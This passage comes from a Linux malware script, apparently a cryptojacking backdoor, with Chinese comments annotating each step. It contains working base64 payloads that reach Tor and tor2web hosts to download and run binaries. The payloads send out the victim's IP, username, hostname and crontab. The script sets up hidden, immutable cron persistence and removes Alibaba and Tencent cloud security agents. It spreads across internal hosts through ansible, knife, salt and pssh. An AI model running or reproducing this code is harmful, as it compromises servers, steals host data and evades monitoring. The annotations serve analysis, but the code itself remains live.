\"#\\x21/bin/bash\\nexec &>/dev/null\\necho QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK\\necho UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash\" > $d/.systemd-service.sh # base64 解码函数 #QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK #exec &>/dev/null #export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin #d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # 获取家目录 #c=$(echo \"curl -4fsSLkA- -m200\") # curl -4fsSLkA- -m200 #t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") # 输出字符串，用于拼接后面的Tor网络地址 #dns 解析函数 #sockz() { #n=( # doh.defaultroutes.de # dns.hostux.net # dns.dns-over-https.com # uncensored.lux1.dns.nixnet.xyz # dns.rubyfish.cn # dns.twnic.tw # doh.centraleu.pi-dns.com # doh.dns.sb # doh-fi.blahdns.com # fi.doh.dns.snopyta.org # dns.flatuslifir.is # doh.li # dns.digitale-gesellschaft.ch #) #p=$(echo \"dns-query?name=relay.tor2socks.in\") # $((RANDOM%13))) 产生 0-12的随机数 ${n[$((RANDOM%13))]} => n[random] 用于解析 # 获取relay.tor2socks.in的IP地址 #s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) #} # 执行exit #fexe() { #for i in /dev/shm /usr/bin $d /tmp /var/tmp # do # echo exit > $i/i # chmod +x $i/i # cd $i # ./i # rm -f i # break # done #} #u() { #sockz #fexe #f=/int.$(uname -m) => /int.x86_64 #x=./$(date|md5sum|cut -f1 -d-) => 获取当前时间时间戳MD5值 # $r => 输出本机相关信息及计划任务 #r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) #$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r # curl -4fsSLkA- -m200 -x socks5h://xxx_ip:9050 $t.onion/int.x86_64/ -o ./md5(dateTime) -e 本机相关信息 || curl -4fsSLkA- -m200 $t.$h/int.x86_64 -o ./md5(dateTime) -e 本机相关信息 # 给下载下来的脚本添加执行权限，执行该脚本，再删除该脚本 #chmod +x $x;$x;rm -f $x #} #for h in tor2web.in tor2web.io tor2web.su onion.com.de tor2web.to onion.sh #do # 如果tmp/.X11-unix/01这个pid 在/proc/$pid/status不正常 #if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then # 执行u函数 #u $t.$h #else #break #fi #done # # 修改当前脚本的时间为/bin/grep touch -r /bin/grep $d/.systemd-service.sh # 给家目录下的.systemd-service.sh 添加x权限，并且添加不得任意更动文件或目录的i权限 chmod +x $d/.systemd-service.sh && chattr +i $d/.systemd-service.sh fi #如果opt不存在该脚本，写入/opt/systemd-service.sh if ! ls /opt/systemd-service.sh; then [ -s /opt/systemd-service.sh ] || echo -e \"#\\x21/bin/bash\\nexec &>/dev/null\\necho QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK\\necho UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash\" > /opt/systemd-service.sh # base64 解码函数 # QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # exec &>/dev/null # export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin #d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) #c=$(echo \"curl -4fsSLkA- -m200\") #t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") #sockz() { #n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) #p=$(echo \"dns-query?name=relay.tor2socks.in\") #s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) #} #fexe() { #for i in /dev/shm /usr/bin $d /tmp /var/tmp ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done #} #u() { #sockz #fexe #f=/int.$(uname -m) #x=./$(date|md5sum|cut -f1 -d-) #r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep 'inet '|awk {'print $2'}|md5sum|awk {'print $1'})_$(crontab -l|base64 -w0) #$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r #chmod +x $x;$x;rm -f $x #} #for h in tor2web.in tor2web.io tor2web.su onion.com.de tor2web.to onion.sh #do #if ! ls /proc/$(head -1 /tmp/.X11-unix/01)/status; then #u $t.$h #else #break #fi #done # 创建文件，并使用/bin/grep下的时间混淆 touch -r /bin/grep /opt/systemd-service.sh # 添加x权限，并且添加不得任意更动文件或目录的i权限 chmod +x /opt/systemd-service.sh && chattr +i /opt/systemd-service.sh fi # 如果/etc/cron.d/0systemd-service定时任务不存在，则写入定时任务 if ! ls /etc/cron.d/0systemd-service; then [ -s /etc/cron.d/0systemd-service ] || echo \"$(echo $((RANDOM%59))) * * * * root /opt/systemd-service.sh > /dev/null 2>&1 &\" > /etc/cron.d/0systemd-service touch -r /bin/grep /etc/cron.d/0systemd-service fi # 如果用户的定时任务不存在，则写入crontab if ! crontab -l | grep ^[0-9] | grep systemd-service.sh; then (echo \"$(echo $((RANDOM%59))) * * * * $d/.systemd-service.sh > /dev/null 2>&1 &\";crontab -l|grep -v systemd-service.sh)|crontab - fi } x bash echo QX5wsK0nNc3lrAwFqXXI7CCihAZomEVoittxI4nkPcH8PWeV8H/jKxz9R8tJnkKK # 屏蔽指定进程终端上的标准输出信息 exec &>/dev/null # 指定脚本执行的临时环境变量 export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # id -u (uid) grep x:$uid: /etc/passwd => 取出当前用户 # cut -d: -f6 => -d: 以:为分界符，-f --fields 选中的列表，-f6 指 第6列，为用户的家目录 # $d = 当前用户的家目录 /home/aaron d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) # $c 是curl命令的字符串，用于拼接字符串 c=$(echo \"curl -4fsSLkA- -m200\") # $t 是字符串用于url拼接 t=$(echo \"4k6jta4zrwzm7u54am3vnjpnlvlbujyvrtprytf4scmrw7u3udmgqaqd\") # sockz是dns解析函数 sockz() { n=(doh.defaultroutes.de dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch) p=$(echo \"dns-query?name=relay.tor2socks.in\") s=$($c https://${n[$((RANDOM%13))]}/$p | grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" |tr ' ' '\\n'|sort -uR|head -1) } # 向目标目录写入exit，并添加x权限，并执行，最后删除 fexe() { for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done } isys() { echo ZXhwb3J0IFBBVEg9JFBBVEg6JEhPTUU6L2Jpbjovc2JpbjovdXNyL2JpbjovdXNyL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9sb2NhbC9zYmluCmZ1bmN0aW9uIF9fY3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCmN1cmwgLVYgfHwgYXB0LWdldCB1cGRhdGUgJiYgYXB0LWdldCAteSBpbnN0YWxsIGN1cmwKY3VybCAtViB8fCB5dW0gLXkgaW5zdGFsbCBjdXJsCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzAuMC9jdXJsLWFtZDY0IC1PIC91c3IvbG9jYWwvYmluL2N1cmw7Y2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vY3VybApjdXJsIC1WIHx8IHdnZXQgLXEgaHR0cHM6Ly9naXRodWIuY29tL21vcGFyaXN0aGViZXN0L3N0YXRpYy1jdXJsL3JlbGVhc2VzL2Rvd25sb2FkL3Y3LjcwLjAvY3VybC1hbWQ2NCAtTyAkSE9NRS9jdXJsO2NobW9kICt4ICRIT01FL2N1cmwKY3VybCAtViB8fCBfX2N1cmwgaHR0cDovLzEyMC4yNy4yNi4xODk6ODEvY3VybCA+IC91c3IvbG9jYWwvYmluL2N1cmw7Y2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vY3VybApjdXJsIC1WIHx8IF9fY3VybCBodHRwOi8vMTIwLjI3LjI2LjE4OTo4MS9jdXJsID4gJEhPTUUvY3VybDtjaG1vZCAreCAkSE9NRS9jdXJsCg==base64 -d|bash # 指定临时环境变量 # export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin # function __curl() { # read proto server path /dev/tcp/${HOST}/$PORT # echo -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3 # (while read line; do # [[ \"$line\" == $'\\r' ]] && break # done && cat) &- #} #curl -V || apt-get update && apt-get -y install curl #curl -V || yum -y install curl #curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.70.0/curl-amd64 -O /usr/local/bin/curl;chmod +x /usr/local/bin/curl #curl -V || wget -q https://github.com/moparisthebest/static-curl/releases/download/v7.70.0/curl-amd64 -O $HOME/curl;chmod +x $HOME/curl #curl -V || __curl http://120.27.26.189:81/curl > /usr/local/bin/curl;chmod +x /usr/local/bin/curl #curl -V || __curl http://120.27.26.189:81/curl > $HOME/curl;chmod +x $HOME/curl sysctl -w vm.nr_hugepages=1024 crontab -l || yum -y install cron crontab -l || yum -y install cronie crontab -l || apt-get update && apt-get -y install cron /etc/init.d/aegis uninstall /usr/local/qcloud/monitor/barad/admin/uninstall.sh /usr/local/qcloud/stargate/admin/uninstall.sh /usr/local/qcloud/YunJing/uninst.sh rm -rf /usr/loca/qcloud/ /usr/local/aegis/ systemctl start cron systemctl enable cron systemctl start crond systemctl enable crond } # 内网投毒 issh() { ansible all -m shell -a 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' knife ssh 'name:*' 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' salt '*' cmd.run 'echo UVg1d3NLMG5OYzNsckF3RnFYWEk3Q0NpaEFab21FVm9pdHR4STRua1BjSDhQV2VWOEgvakt4ejlSOHRKbmtLSwpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICI0azZqdGE0enJ3em03dTU0YW0zdm5qcG5sdmxidWp5dnJ0cHJ5dGY0c2Ntcnc3dTN1ZG1ncWFxZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgZG5zLmRucy1vdmVyLWh0dHBzLmNvbSB1bmNlbnNvcmVkLmx1eDEuZG5zLm5peG5ldC54eXogZG5zLnJ1YnlmaXNoLmNuIGRucy50d25pYy50dyBkb2guY2VudHJhbGV1LnBpLWRucy5jb20gZG9oLmRucy5zYiBkb2gtZmkuYmxhaGRucy5jb20gZmkuZG9oLmRucy5zbm9weXRhLm9yZyBkbnMuZmxhdHVzbGlmaXIuaXMgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTEzKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8c29ydCAtdVJ8aGVhZCAtMSkKfQoKZmV4ZSgpIHsKZm9yIGkgaW4gL2Rldi9zaG0gL3Vzci9iaW4gJGQgL3RtcCAvdmFyL3RtcCA7ZG8gZWNobyBleGl0ID4gJGkvaSAmJiBjaG1vZCAreCAkaS9pICYmIGNkICRpICYmIC4vaSAmJiBybSAtZiBpICYmIGJyZWFrO2RvbmUKfQoKdSgpIHsKc29ja3oKZmV4ZQpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaW8gdG9yMndlYi5zdSBvbmlvbi5jb20uZGUgdG9yMndlYi50byBvbmlvbi5zaApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCnUgJHQuJGgKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash' pssh 'echo 